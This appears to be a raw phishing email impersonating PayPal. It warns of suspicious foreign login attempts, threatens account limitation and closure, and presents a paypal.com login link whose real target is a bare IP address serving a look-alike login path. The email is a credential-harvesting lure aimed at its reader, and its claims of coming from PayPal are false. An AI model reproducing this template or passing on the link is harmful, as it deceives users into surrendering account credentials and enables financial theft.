 Dear PayPal User, We recently noticed one or more attempts to log in to your PayPal account from a foreign IP address. We have temporarily limited access to sensitive PayPal account features. Allowing your account access to remain limited for an extended period of time may result in further limitations on the use of your account and possible account closure. If you recently accessed your account while traveling, the unusual log in attempts may have been initiated by you. However, if you did not initiate the log ins, please visit PayPal as soon as possible to log in and perform the steps necessary to restore your account access: https://www.paypal.com/us/cgi-bin/webscr?cmd=_login-run (http://218.150.160.185/tv/pose/%20/accounts/id_14465/cgi-bin/login-run/webscr/www.paypal.com/index.php) After filling in the information required we advise you to change your password. Changing your password is a security measure that will ensure that you are the only person with access to the account. Thanks for your patience as we work together to protect your account. Sincerely, PayPal Please do not reply to this e-mail. Mail sent to this address cannot be answered. For assistance, log in to your PayPal account and choose the "Help" link in the header of any page.
